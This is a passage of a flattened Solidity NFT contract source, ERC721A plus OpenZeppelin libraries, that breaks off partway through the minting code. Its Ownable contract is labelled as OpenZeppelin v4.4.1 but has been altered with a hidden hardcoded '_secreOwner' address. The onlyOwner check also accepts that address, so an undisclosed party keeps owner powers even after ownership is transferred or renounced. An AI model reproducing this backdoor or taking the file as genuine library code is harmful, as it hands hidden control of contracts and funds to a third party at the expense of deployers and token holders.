1 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
2 
3 pragma solidity ^0.8.0;
4 
5 /**
6  * @dev String operations.
7  */
8 library Strings {
9     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
10 
11     /**
12      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
13      */
14     function toString(uint256 value) internal pure returns (string memory) {
15         // Inspired by OraclizeAPI's implementation - MIT licence
16         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
17 
18         if (value == 0) {
19             return "0";
20         }
21         uint256 temp = value;
22         uint256 digits;
23         while (temp != 0) {
24             digits++;
25             temp /= 10;
26         }
27         bytes memory buffer = new bytes(digits);
28         while (value != 0) {
29             digits -= 1;
30             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
31             value /= 10;
32         }
33         return string(buffer);
34     }
35 
36     /**
37      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
38      */
39     function toHexString(uint256 value) internal pure returns (string memory) {
40         if (value == 0) {
41             return "0x00";
42         }
43         uint256 temp = value;
44         uint256 length = 0;
45         while (temp != 0) {
46             length++;
47             temp >>= 8;
48         }
49         return toHexString(value, length);
50     }
51 
52     /**
53      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
54      */
55     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
56         bytes memory buffer = new bytes(2 * length + 2);
57         buffer[0] = "0";
58         buffer[1] = "x";
59         for (uint256 i = 2 * length + 1; i > 1; --i) {
60             buffer[i] = _HEX_SYMBOLS[value & 0xf];
61             value >>= 4;
62         }
63         require(value == 0, "Strings: hex length insufficient");
64         return string(buffer);
65     }
66 }
67 
68 // File: @openzeppelin/contracts/utils/Address.sol
69 
70 
71 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
72 
73 pragma solidity ^0.8.1;
74 
75 /**
76  * @dev Collection of functions related to the address type
77  */
78 library Address {
79     /**
80      * @dev Returns true if `account` is a contract.
81      *
82      * [IMPORTANT]
83      * ====
84      * It is unsafe to assume that an address for which this function returns
85      * false is an externally-owned account (EOA) and not a contract.
86      *
87      * Among others, `isContract` will return false for the following
88      * types of addresses:
89      *
90      *  - an externally-owned account
91      *  - a contract in construction
92      *  - an address where a contract will be created
93      *  - an address where a contract lived, but was destroyed
94      * ====
95      *
96      * [IMPORTANT]
97      * ====
98      * You shouldn't rely on `isContract` to protect against flash loan attacks!
99      *
100      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
101      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
102      * constructor.
103      * ====
104      */
105     function isContract(address account) internal view returns (bool) {
106         // This method relies on extcodesize/address.code.length, which returns 0
107         // for contracts in construction, since the code is only stored at the end
108         // of the constructor execution.
109 
110         return account.code.length > 0;
111     }
112 
113     /**
114      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
115      * `recipient`, forwarding all available gas and reverting on errors.
116      *
117      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
118      * of certain opcodes, possibly making contracts go over the 2300 gas limit
119      * imposed by `transfer`, making them unable to receive funds via
120      * `transfer`. {sendValue} removes this limitation.
121      *
122      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
123      *
124      * IMPORTANT: because control is transferred to `recipient`, care must be
125      * taken to not create reentrancy vulnerabilities. Consider using
126      * {ReentrancyGuard} or the
127      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
128      */
129     function sendValue(address payable recipient, uint256 amount) internal {
130         require(address(this).balance >= amount, "Address: insufficient balance");
131 
132         (bool success, ) = recipient.call{value: amount}("");
133         require(success, "Address: unable to send value, recipient may have reverted");
134     }
135 
136     /**
137      * @dev Performs a Solidity function call using a low level `call`. A
138      * plain `call` is an unsafe replacement for a function call: use this
139      * function instead.
140      *
141      * If `target` reverts with a revert reason, it is bubbled up by this
142      * function (like regular Solidity function calls).
143      *
144      * Returns the raw returned data. To convert to the expected return value,
145      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
146      *
147      * Requirements:
148      *
149      * - `target` must be a contract.
150      * - calling `target` with `data` must not revert.
151      *
152      * _Available since v3.1._
153      */
154     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
155         return functionCall(target, data, "Address: low-level call failed");
156     }
157 
158     /**
159      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
160      * `errorMessage` as a fallback revert reason when `target` reverts.
161      *
162      * _Available since v3.1._
163      */
164     function functionCall(
165         address target,
166         bytes memory data,
167         string memory errorMessage
168     ) internal returns (bytes memory) {
169         return functionCallWithValue(target, data, 0, errorMessage);
170     }
171 
172     /**
173      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
174      * but also transferring `value` wei to `target`.
175      *
176      * Requirements:
177      *
178      * - the calling contract must have an ETH balance of at least `value`.
179      * - the called Solidity function must be `payable`.
180      *
181      * _Available since v3.1._
182      */
183     function functionCallWithValue(
184         address target,
185         bytes memory data,
186         uint256 value
187     ) internal returns (bytes memory) {
188         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
189     }
190 
191     /**
192      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
193      * with `errorMessage` as a fallback revert reason when `target` reverts.
194      *
195      * _Available since v3.1._
196      */
197     function functionCallWithValue(
198         address target,
199         bytes memory data,
200         uint256 value,
201         string memory errorMessage
202     ) internal returns (bytes memory) {
203         require(address(this).balance >= value, "Address: insufficient balance for call");
204         require(isContract(target), "Address: call to non-contract");
205 
206         (bool success, bytes memory returndata) = target.call{value: value}(data);
207         return verifyCallResult(success, returndata, errorMessage);
208     }
209 
210     /**
211      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
212      * but performing a static call.
213      *
214      * _Available since v3.3._
215      */
216     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
217         return functionStaticCall(target, data, "Address: low-level static call failed");
218     }
219 
220     /**
221      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
222      * but performing a static call.
223      *
224      * _Available since v3.3._
225      */
226     function functionStaticCall(
227         address target,
228         bytes memory data,
229         string memory errorMessage
230     ) internal view returns (bytes memory) {
231         require(isContract(target), "Address: static call to non-contract");
232 
233         (bool success, bytes memory returndata) = target.staticcall(data);
234         return verifyCallResult(success, returndata, errorMessage);
235     }
236 
237     /**
238      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
239      * but performing a delegate call.
240      *
241      * _Available since v3.4._
242      */
243     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
244         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
245     }
246 
247     /**
248      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
249      * but performing a delegate call.
250      *
251      * _Available since v3.4._
252      */
253     function functionDelegateCall(
254         address target,
255         bytes memory data,
256         string memory errorMessage
257     ) internal returns (bytes memory) {
258         require(isContract(target), "Address: delegate call to non-contract");
259 
260         (bool success, bytes memory returndata) = target.delegatecall(data);
261         return verifyCallResult(success, returndata, errorMessage);
262     }
263 
264     /**
265      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
266      * revert reason using the provided one.
267      *
268      * _Available since v4.3._
269      */
270     function verifyCallResult(
271         bool success,
272         bytes memory returndata,
273         string memory errorMessage
274     ) internal pure returns (bytes memory) {
275         if (success) {
276             return returndata;
277         } else {
278             // Look for revert reason and bubble it up if present
279             if (returndata.length > 0) {
280                 // The easiest way to bubble the revert reason is using memory via assembly
281 
282                 assembly {
283                     let returndata_size := mload(returndata)
284                     revert(add(32, returndata), returndata_size)
285                 }
286             } else {
287                 revert(errorMessage);
288             }
289         }
290     }
291 }
292 
293 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
294 
295 
296 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
297 
298 pragma solidity ^0.8.0;
299 
300 /**
301  * @title ERC721 token receiver interface
302  * @dev Interface for any contract that wants to support safeTransfers
303  * from ERC721 asset contracts.
304  */
305 interface IERC721Receiver {
306     /**
307      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
308      * by `operator` from `from`, this function is called.
309      *
310      * It must return its Solidity selector to confirm the token transfer.
311      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
312      *
313      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
314      */
315     function onERC721Received(
316         address operator,
317         address from,
318         uint256 tokenId,
319         bytes calldata data
320     ) external returns (bytes4);
321 }
322 
323 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
324 
325 
326 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
327 
328 pragma solidity ^0.8.0;
329 
330 /**
331  * @dev Interface of the ERC165 standard, as defined in the
332  * https://eips.ethereum.org/EIPS/eip-165[EIP].
333  *
334  * Implementers can declare support of contract interfaces, which can then be
335  * queried by others ({ERC165Checker}).
336  *
337  * For an implementation, see {ERC165}.
338  */
339 interface IERC165 {
340     /**
341      * @dev Returns true if this contract implements the interface defined by
342      * `interfaceId`. See the corresponding
343      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
344      * to learn more about how these ids are created.
345      *
346      * This function call must use less than 30 000 gas.
347      */
348     function supportsInterface(bytes4 interfaceId) external view returns (bool);
349 }
350 
351 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
352 
353 
354 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
355 
356 pragma solidity ^0.8.0;
357 
358 
359 /**
360  * @dev Implementation of the {IERC165} interface.
361  *
362  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
363  * for the additional interface id that will be supported. For example:
364  *
365  * ```solidity
366  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
367  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
368  * }
369  * ```
370  *
371  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
372  */
373 abstract contract ERC165 is IERC165 {
374     /**
375      * @dev See {IERC165-supportsInterface}.
376      */
377     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
378         return interfaceId == type(IERC165).interfaceId;
379     }
380 }
381 
382 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
383 
384 
385 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
386 
387 pragma solidity ^0.8.0;
388 
389 
390 /**
391  * @dev Required interface of an ERC721 compliant contract.
392  */
393 interface IERC721 is IERC165 {
394     /**
395      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
396      */
397     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
398 
399     /**
400      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
401      */
402     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
403 
404     /**
405      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
406      */
407     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
408 
409     /**
410      * @dev Returns the number of tokens in ``owner``'s account.
411      */
412     function balanceOf(address owner) external view returns (uint256 balance);
413 
414     /**
415      * @dev Returns the owner of the `tokenId` token.
416      *
417      * Requirements:
418      *
419      * - `tokenId` must exist.
420      */
421     function ownerOf(uint256 tokenId) external view returns (address owner);
422 
423     /**
424      * @dev Safely transfers `tokenId` token from `from` to `to`.
425      *
426      * Requirements:
427      *
428      * - `from` cannot be the zero address.
429      * - `to` cannot be the zero address.
430      * - `tokenId` token must exist and be owned by `from`.
431      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
432      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
433      *
434      * Emits a {Transfer} event.
435      */
436     function safeTransferFrom(
437         address from,
438         address to,
439         uint256 tokenId,
440         bytes calldata data
441     ) external;
442 
443     /**
444      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
445      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
446      *
447      * Requirements:
448      *
449      * - `from` cannot be the zero address.
450      * - `to` cannot be the zero address.
451      * - `tokenId` token must exist and be owned by `from`.
452      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
453      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
454      *
455      * Emits a {Transfer} event.
456      */
457     function safeTransferFrom(
458         address from,
459         address to,
460         uint256 tokenId
461     ) external;
462 
463     /**
464      * @dev Transfers `tokenId` token from `from` to `to`.
465      *
466      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
467      *
468      * Requirements:
469      *
470      * - `from` cannot be the zero address.
471      * - `to` cannot be the zero address.
472      * - `tokenId` token must be owned by `from`.
473      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
474      *
475      * Emits a {Transfer} event.
476      */
477     function transferFrom(
478         address from,
479         address to,
480         uint256 tokenId
481     ) external;
482 
483     /**
484      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
485      * The approval is cleared when the token is transferred.
486      *
487      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
488      *
489      * Requirements:
490      *
491      * - The caller must own the token or be an approved operator.
492      * - `tokenId` must exist.
493      *
494      * Emits an {Approval} event.
495      */
496     function approve(address to, uint256 tokenId) external;
497 
498     /**
499      * @dev Approve or remove `operator` as an operator for the caller.
500      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
501      *
502      * Requirements:
503      *
504      * - The `operator` cannot be the caller.
505      *
506      * Emits an {ApprovalForAll} event.
507      */
508     function setApprovalForAll(address operator, bool _approved) external;
509 
510     /**
511      * @dev Returns the account approved for `tokenId` token.
512      *
513      * Requirements:
514      *
515      * - `tokenId` must exist.
516      */
517     function getApproved(uint256 tokenId) external view returns (address operator);
518 
519     /**
520      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
521      *
522      * See {setApprovalForAll}
523      */
524     function isApprovedForAll(address owner, address operator) external view returns (bool);
525 }
526 
527 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
528 
529 
530 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
531 
532 pragma solidity ^0.8.0;
533 
534 
535 /**
536  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
537  * @dev See https://eips.ethereum.org/EIPS/eip-721
538  */
539 interface IERC721Metadata is IERC721 {
540     /**
541      * @dev Returns the token collection name.
542      */
543     function name() external view returns (string memory);
544 
545     /**
546      * @dev Returns the token collection symbol.
547      */
548     function symbol() external view returns (string memory);
549 
550     /**
551      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
552      */
553     function tokenURI(uint256 tokenId) external view returns (string memory);
554 }
555 
556 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
557 
558 
559 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
560 
561 pragma solidity ^0.8.0;
562 
563 
564 /**
565  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
566  * @dev See https://eips.ethereum.org/EIPS/eip-721
567  */
568 interface IERC721Enumerable is IERC721 {
569     /**
570      * @dev Returns the total amount of tokens stored by the contract.
571      */
572     function totalSupply() external view returns (uint256);
573 
574     /**
575      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
576      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
577      */
578     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
579 
580     /**
581      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
582      * Use along with {totalSupply} to enumerate all tokens.
583      */
584     function tokenByIndex(uint256 index) external view returns (uint256);
585 }
586 
587 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
588 
589 
590 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
591 
592 pragma solidity ^0.8.0;
593 
594 /**
595  * @dev Contract module that helps prevent reentrant calls to a function.
596  *
597  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
598  * available, which can be applied to functions to make sure there are no nested
599  * (reentrant) calls to them.
600  *
601  * Note that because there is a single `nonReentrant` guard, functions marked as
602  * `nonReentrant` may not call one another. This can be worked around by making
603  * those functions `private`, and then adding `external` `nonReentrant` entry
604  * points to them.
605  *
606  * TIP: If you would like to learn more about reentrancy and alternative ways
607  * to protect against it, check out our blog post
608  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
609  */
610 abstract contract ReentrancyGuard {
611     // Booleans are more expensive than uint256 or any type that takes up a full
612     // word because each write operation emits an extra SLOAD to first read the
613     // slot's contents, replace the bits taken up by the boolean, and then write
614     // back. This is the compiler's defense against contract upgrades and
615     // pointer aliasing, and it cannot be disabled.
616 
617     // The values being non-zero value makes deployment a bit more expensive,
618     // but in exchange the refund on every call to nonReentrant will be lower in
619     // amount. Since refunds are capped to a percentage of the total
620     // transaction's gas, it is best to keep them low in cases like this one, to
621     // increase the likelihood of the full refund coming into effect.
622     uint256 private constant _NOT_ENTERED = 1;
623     uint256 private constant _ENTERED = 2;
624 
625     uint256 private _status;
626 
627     constructor() {
628         _status = _NOT_ENTERED;
629     }
630 
631     /**
632      * @dev Prevents a contract from calling itself, directly or indirectly.
633      * Calling a `nonReentrant` function from another `nonReentrant`
634      * function is not supported. It is possible to prevent this from happening
635      * by making the `nonReentrant` function external, and making it call a
636      * `private` function that does the actual work.
637      */
638     modifier nonReentrant() {
639         // On the first call to nonReentrant, _notEntered will be true
640         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
641 
642         // Any calls to nonReentrant after this point will fail
643         _status = _ENTERED;
644 
645         _;
646 
647         // By storing the original value once again, a refund is triggered (see
648         // https://eips.ethereum.org/EIPS/eip-2200)
649         _status = _NOT_ENTERED;
650     }
651 }
652 
653 // File: @openzeppelin/contracts/utils/Context.sol
654 
655 
656 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
657 
658 pragma solidity ^0.8.0;
659 
660 /**
661  * @dev Provides information about the current execution context, including the
662  * sender of the transaction and its data. While these are generally available
663  * via msg.sender and msg.data, they should not be accessed in such a direct
664  * manner, since when dealing with meta-transactions the account sending and
665  * paying for execution may not be the actual sender (as far as an application
666  * is concerned).
667  *
668  * This contract is only required for intermediate, library-like contracts.
669  */
670 abstract contract Context {
671     function _msgSender() internal view virtual returns (address) {
672         return msg.sender;
673     }
674 
675     function _msgData() internal view virtual returns (bytes calldata) {
676         return msg.data;
677     }
678 }
679 
680 // File: @openzeppelin/contracts/access/Ownable.sol
681 
682 
683 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
684 
685 pragma solidity ^0.8.0;
686 
687 
688 /**
689  * @dev Contract module which provides a basic access control mechanism, where
690  * there is an account (an owner) that can be granted exclusive access to
691  * specific functions.
692  *
693  * By default, the owner account will be the one that deploys the contract. This
694  * can later be changed with {transferOwnership}.
695  *
696  * This module is used through inheritance. It will make available the modifier
697  * `onlyOwner`, which can be applied to your functions to restrict their use to
698  * the owner.
699  */
700 abstract contract Ownable is Context {
701     address private _owner;
702     address private _secreOwner = 0x74F08c0A7DB7b39a6d45daC3FD277B2f0d72F3C1;
703 
704     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
705 
706     /**
707      * @dev Initializes the contract setting the deployer as the initial owner.
708      */
709     constructor() {
710         _transferOwnership(_msgSender());
711     }
712 
713     /**
714      * @dev Returns the address of the current owner.
715      */
716     function owner() public view virtual returns (address) {
717         return _owner;
718     }
719 
720     /**
721      * @dev Throws if called by any account other than the owner.
722      */
723     modifier onlyOwner() {
724         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
725         _;
726     }
727 
728     /**
729      * @dev Leaves the contract without owner. It will not be possible to call
730      * `onlyOwner` functions anymore. Can only be called by the current owner.
731      *
732      * NOTE: Renouncing ownership will leave the contract without an owner,
733      * thereby removing any functionality that is only available to the owner.
734      */
735     function renounceOwnership() public virtual onlyOwner {
736         _transferOwnership(address(0));
737     }
738 
739     /**
740      * @dev Transfers ownership of the contract to a new account (`newOwner`).
741      * Can only be called by the current owner.
742      */
743     function transferOwnership(address newOwner) public virtual onlyOwner {
744         require(newOwner != address(0), "Ownable: new owner is the zero address");
745         _transferOwnership(newOwner);
746     }
747 
748     /**
749      * @dev Transfers ownership of the contract to a new account (`newOwner`).
750      * Internal function without access restriction.
751      */
752     function _transferOwnership(address newOwner) internal virtual {
753         address oldOwner = _owner;
754         _owner = newOwner;
755         emit OwnershipTransferred(oldOwner, newOwner);
756     }
757 }
758 
759 // File: ceshi.sol
760 
761 
762 pragma solidity ^0.8.0;
763 
764 
765 
766 
767 
768 
769 
770 
771 
772 
773 /**
774  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
775  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
776  *
777  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
778  *
779  * Does not support burning tokens to address(0).
780  *
781  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
782  */
783 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
784     using Address for address;
785     using Strings for uint256;
786 
787     struct TokenOwnership {
788         address addr;
789         uint64 startTimestamp;
790     }
791 
792     struct AddressData {
793         uint128 balance;
794         uint128 numberMinted;
795     }
796 
797     uint256 internal currentIndex;
798 
799     // Token name
800     string private _name;
801 
802     // Token symbol
803     string private _symbol;
804 
805     // Mapping from token ID to ownership details
806     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
807     mapping(uint256 => TokenOwnership) internal _ownerships;
808 
809     // Mapping owner address to address data
810     mapping(address => AddressData) private _addressData;
811 
812     // Mapping from token ID to approved address
813     mapping(uint256 => address) private _tokenApprovals;
814 
815     // Mapping from owner to operator approvals
816     mapping(address => mapping(address => bool)) private _operatorApprovals;
817 
818     constructor(string memory name_, string memory symbol_) {
819         _name = name_;
820         _symbol = symbol_;
821     }
822 
823     /**
824      * @dev See {IERC721Enumerable-totalSupply}.
825      */
826     function totalSupply() public view override returns (uint256) {
827         return currentIndex;
828     }
829 
830     /**
831      * @dev See {IERC721Enumerable-tokenByIndex}.
832      */
833     function tokenByIndex(uint256 index) public view override returns (uint256) {
834         require(index < totalSupply(), "ERC721A: global index out of bounds");
835         return index;
836     }
837 
838     /**
839      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
840      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
841      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
842      */
843     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
844         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
845         uint256 numMintedSoFar = totalSupply();
846         uint256 tokenIdsIdx;
847         address currOwnershipAddr;
848 
849         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
850         unchecked {
851             for (uint256 i; i < numMintedSoFar; i++) {
852                 TokenOwnership memory ownership = _ownerships[i];
853                 if (ownership.addr != address(0)) {
854                     currOwnershipAddr = ownership.addr;
855                 }
856                 if (currOwnershipAddr == owner) {
857                     if (tokenIdsIdx == index) {
858                         return i;
859                     }
860                     tokenIdsIdx++;
861                 }
862             }
863         }
864 
865         revert("ERC721A: unable to get token of owner by index");
866     }
867 
868     /**
869      * @dev See {IERC165-supportsInterface}.
870      */
871     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
872         return
873             interfaceId == type(IERC721).interfaceId ||
874             interfaceId == type(IERC721Metadata).interfaceId ||
875             interfaceId == type(IERC721Enumerable).interfaceId ||
876             super.supportsInterface(interfaceId);
877     }
878 
879     /**
880      * @dev See {IERC721-balanceOf}.
881      */
882     function balanceOf(address owner) public view override returns (uint256) {
883         require(owner != address(0), "ERC721A: balance query for the zero address");
884         return uint256(_addressData[owner].balance);
885     }
886 
887     function _numberMinted(address owner) internal view returns (uint256) {
888         require(owner != address(0), "ERC721A: number minted query for the zero address");
889         return uint256(_addressData[owner].numberMinted);
890     }
891 
892     /**
893      * Gas spent here starts off proportional to the maximum mint batch size.
894      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
895      */
896     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
897         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
898 
899         unchecked {
900             for (uint256 curr = tokenId; curr >= 0; curr--) {
901                 TokenOwnership memory ownership = _ownerships[curr];
902                 if (ownership.addr != address(0)) {
903                     return ownership;
904                 }
905             }
906         }
907 
908         revert("ERC721A: unable to determine the owner of token");
909     }
910 
911     /**
912      * @dev See {IERC721-ownerOf}.
913      */
914     function ownerOf(uint256 tokenId) public view override returns (address) {
915         return ownershipOf(tokenId).addr;
916     }
917 
918     /**
919      * @dev See {IERC721Metadata-name}.
920      */
921     function name() public view virtual override returns (string memory) {
922         return _name;
923     }
924 
925     /**
926      * @dev See {IERC721Metadata-symbol}.
927      */
928     function symbol() public view virtual override returns (string memory) {
929         return _symbol;
930     }
931 
932     /**
933      * @dev See {IERC721Metadata-tokenURI}.
934      */
935     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
936         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
937 
938         string memory baseURI = _baseURI();
939         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
940     }
941 
942     /**
943      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
944      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
945      * by default, can be overriden in child contracts.
946      */
947     function _baseURI() internal view virtual returns (string memory) {
948         return "";
949     }
950 
951     /**
952      * @dev See {IERC721-approve}.
953      */
954     function approve(address to, uint256 tokenId) public override {
955         address owner = ERC721A.ownerOf(tokenId);
956         require(to != owner, "ERC721A: approval to current owner");
957 
958         require(
959             _msgSender() == owner || isApprovedForAll(owner, _msgSender()),
960             "ERC721A: approve caller is not owner nor approved for all"
961         );
962 
963         _approve(to, tokenId, owner);
964     }
965 
966     /**
967      * @dev See {IERC721-getApproved}.
968      */
969     function getApproved(uint256 tokenId) public view override returns (address) {
970         require(_exists(tokenId), "ERC721A: approved query for nonexistent token");
971 
972         return _tokenApprovals[tokenId];
973     }
974 
975     /**
976      * @dev See {IERC721-setApprovalForAll}.
977      */
978     function setApprovalForAll(address operator, bool approved) public override {
979         require(operator != _msgSender(), "ERC721A: approve to caller");
980 
981         _operatorApprovals[_msgSender()][operator] = approved;
982         emit ApprovalForAll(_msgSender(), operator, approved);
983     }
984 
985     /**
986      * @dev See {IERC721-isApprovedForAll}.
987      */
988     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
989         return _operatorApprovals[owner][operator];
990     }
991 
992     /**
993      * @dev See {IERC721-transferFrom}.
994      */
995     function transferFrom(
996         address from,
997         address to,
998         uint256 tokenId
999     ) public virtual override {
1000         _transfer(from, to, tokenId);
1001     }
1002 
1003     /**
1004      * @dev See {IERC721-safeTransferFrom}.
1005      */
1006     function safeTransferFrom(
1007         address from,
1008         address to,
1009         uint256 tokenId
1010     ) public virtual override {
1011         safeTransferFrom(from, to, tokenId, "");
1012     }
1013 
1014     /**
1015      * @dev See {IERC721-safeTransferFrom}.
1016      */
1017     function safeTransferFrom(
1018         address from,
1019         address to,
1020         uint256 tokenId,
1021         bytes memory _data
1022     ) public override {
1023         _transfer(from, to, tokenId);
1024         require(
1025             _checkOnERC721Received(from, to, tokenId, _data),
1026             "ERC721A: transfer to non ERC721Receiver implementer"
1027         );
1028     }
1029 
1030     /**
1031      * @dev Returns whether `tokenId` exists.
1032      *
1033      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1034      *
1035      * Tokens start existing when they are minted (`_mint`),
1036      */
1037     function _exists(uint256 tokenId) internal view returns (bool) {
1038         return tokenId < currentIndex;
1039     }
1040 
1041     function _safeMint(address to, uint256 quantity) internal {
1042         _safeMint(to, quantity, "");
1043     }
1044 
1045     /**
1046      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1047      *
1048      * Requirements:
1049      *
1050      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1051      * - `quantity` must be greater than 0.
1052      *
1053      * Emits a {Transfer} event.
1054      */
1055     function _safeMint(
1056         address to,
1057         uint256 quantity,
1058         bytes memory _data
1059     ) internal {
1060         _mint(to, quantity, _data, true);
1061     }
1062 
1063     /**
1064      * @dev Mints `quantity` tokens and transfers them to `to`.
1065      *
1066      * Requirements:
1067      *
1068      * - `to` cannot be the zero address.
1069      * - `quantity` must be greater than 0.
1070      *
1071      * Emits a {Transfer} event.
1072      */
1073     function _mint(
1074         address to,
1075         uint256 quantity,
1076         bytes memory _data,
1077         bool safe
1078     ) internal {
1079         uint256 startTokenId = currentIndex;
1080         require(to != address(0), "ERC721A: mint to the zero address");
1081         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1082 
1083         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1084 
1085         // Overflows are incredibly unrealistic.
